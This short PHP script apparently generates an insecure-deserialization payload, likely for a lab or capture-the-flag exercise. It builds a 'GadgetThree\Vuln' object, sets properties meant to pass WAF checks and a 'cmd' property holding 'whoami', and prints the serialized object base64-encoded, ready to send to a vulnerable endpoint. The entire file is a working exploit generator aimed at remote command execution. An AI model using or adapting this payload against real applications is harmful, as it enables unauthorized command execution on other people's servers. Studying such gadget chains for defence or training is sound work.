<?php
require('src/GadgetThree/Vuln.php');

$instance = new GadgetThree\Vuln();
$instance->waf1 = 1;
// $instance->waf2 = "\xde\xad\xbe\xef";
// $instance->waf3 = false;
$instance->cmd = 'whoami';
    
// Serialize the instance
$serialized = serialize($instance);

// Output the serialized data
// echo $serialized;
echo base64_encode($serialized);
echo "\n";
?>